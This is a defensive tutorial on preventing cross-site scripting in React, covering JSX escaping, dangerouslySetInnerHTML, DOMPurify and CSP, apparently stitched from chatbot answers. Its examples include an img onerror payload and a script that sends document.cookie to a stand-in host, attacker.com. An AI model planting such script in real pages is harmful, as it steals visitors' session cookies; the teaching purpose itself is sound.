
---

## 🔐 Preventing XSS (Cross-Site Scripting) Attacks in React

**Cross-Site Scripting (XSS)** is a security vulnerability where attackers inject malicious scripts into webpages viewed by other users.

React is inherently **safe from XSS** because it escapes values embedded in JSX. But it's still possible to introduce XSS vulnerabilities through improper handling of user input or third-party data.

---

### ✅ How React Prevents XSS by Default

When you insert values using JSX, React automatically escapes them:

```jsx
const userInput = "<img src=x onerror=alert('XSS') />";
return <div>{userInput}</div>; // React escapes the tag, renders as text
```

This will be rendered safely as:

```html
<div>&lt;img src=x onerror=alert('XSS') /&gt;</div>
```

---

### ❗️ Using `dangerouslySetInnerHTML`

Avoid using `dangerouslySetInnerHTML` unless absolutely necessary. It bypasses React’s escaping and can expose your app to XSS.

```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

✅ **Only use it with trusted content.** Sanitize any dynamic HTML before rendering.

Use libraries like:

- [`dompurify`](https://github.com/cure53/DOMPurify)
  ```js
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
  ```

---

### 🧼 General Tips to Prevent XSS in React

1. **Never trust user input.**
2. **Avoid `dangerouslySetInnerHTML` when possible.**
3. **Sanitize data on both server and client side.**
4. **Use CSP (Content Security Policy)** headers in production.
5. **Keep dependencies up to date.**
6. **Escape dynamic attributes (e.g., in `style`, `href`, etc.).**

---

### 🛡️ Example of Safe Rendering

```jsx
function SafeMessage({ message }) {
  return <p>{message}</p>; // React escapes this safely
}
```


### 🧨 What are **XSS (Cross-Site Scripting) Attacks**?

**XSS (Cross-Site Scripting)** is a type of **security vulnerability** in web applications that allows attackers to **inject malicious JavaScript** into webpages viewed by **other users**.

---

### ⚠️ In simple terms:

> An attacker tricks your website into running **their JavaScript code**, which can steal data, hijack sessions, or deface pages — all in the context of a trusted site.

---

### 🎭 Real-Life Analogy:

Imagine you leave a public comment on a blog post — but instead of a normal comment, someone posts:
```html
<script>stealCookies()</script>
```

If the site **doesn’t sanitize input properly**, this script will run in the browser of **anyone who views that comment**.

---

### 🧪 Example of XSS

#### ✅ User posts:
```html
Hello world!
```

#### ❌ Attacker posts:
```html
<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>
```

Now when another user views the page, that malicious script:
- Runs in **their browser**
- Sends their **cookies/session tokens** to the attacker

---

### 🔄 Types of XSS:

| Type         | Description |
|--------------|-------------|
| **Stored XSS** | Malicious script is saved on the server (e.g., in a comment or profile field) and served to users |
| **Reflected XSS** | Malicious script is part of a URL/query string and immediately reflected in the response |
| **DOM-based XSS** | Script is injected and executed purely on the client side using JavaScript (e.g., through `innerHTML`, `eval`, etc.) |

---

### 🛡️ How to Prevent XSS:

- ✅ **Escape HTML output** (e.g., don’t render raw input directly)
- ✅ **Sanitize user input** (use libraries like DOMPurify)
- ✅ **Use CSP (Content Security Policy)** headers
- ✅ Avoid `innerHTML`, `eval`, or `document.write`
- ✅ Use modern frameworks (React, Angular) that **auto-escape output**

---

### ⚠️ Why it's dangerous:
- Steal cookies/session tokens
- Impersonate users
- Redirect users to phishing sites
- Deface websites
- Perform actions on behalf of the user

---

Let me know if you want to see how to prevent XSS in a React app or Node.js backend!
---

### 📚 Resources

- [React Docs: dangerouslySetInnerHTML](https://react.dev/reference/react-dom/components/common#dangerouslysetinnerhtml)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-prevention)

---
